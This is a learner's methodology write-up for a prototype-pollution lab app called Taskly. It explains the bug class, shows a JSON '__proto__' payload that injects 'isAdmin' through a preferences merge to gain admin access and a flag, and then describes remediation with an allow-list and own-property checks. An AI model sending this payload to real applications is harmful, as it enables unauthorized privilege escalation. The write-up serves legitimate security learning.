# Methodology — Taskly (Prototype Pollution)

My working notes. This was my **first** prototype-pollution lab (I don't code in JS), so I read a
primer on the concept first.

## 1. Understanding the class

Prototype pollution looked simple once I read it — but I expect there are more advanced variants, the
same way XSS, IDOR and SQLi all look simple at first and get deep underneath. The core idea: in JS,
objects share an editable parent (`Object.prototype`), and `__proto__` is the "door" to it. If my
input is merged into a server object, a `__proto__` key writes onto that shared parent and affects
every object.

## 2. Exploitation

The preferences endpoint merges my JSON into a server object. A normal request looks like:

```json
{"theme":"dark","density":"cozy"}
```

So I changed it to pollute the prototype with an `isAdmin` property:

```json
{"__proto__":{"isAdmin":true}}
```

The admin endpoint builds a fresh object and checks `isAdmin` on it — which now inherits my polluted
`true`:

```
FLAG{pr0t0typ3_p0llut10n_pr1v_3sc_v14_merg3}
```

## 3. Remediation

My first fix was gadget-side only — an own-property check on the admin endpoint:

```js
if (Object.hasOwn(perms, "isAdmin") && perms.isAdmin === true) { /* grant */ }
```

That stops this specific check, but the prototype is **still pollutable** through the merge, so any
other gadget would still fire. The root fix is on the **sink**: a schema allow-list that only accepts
the expected keys/values (`theme`, `density`), so arbitrary keys like `__proto__` are never copied.
Best practice is both — allow-list the sink *and* keep the own-property check as defense-in-depth.
See `app_fixed.js`.
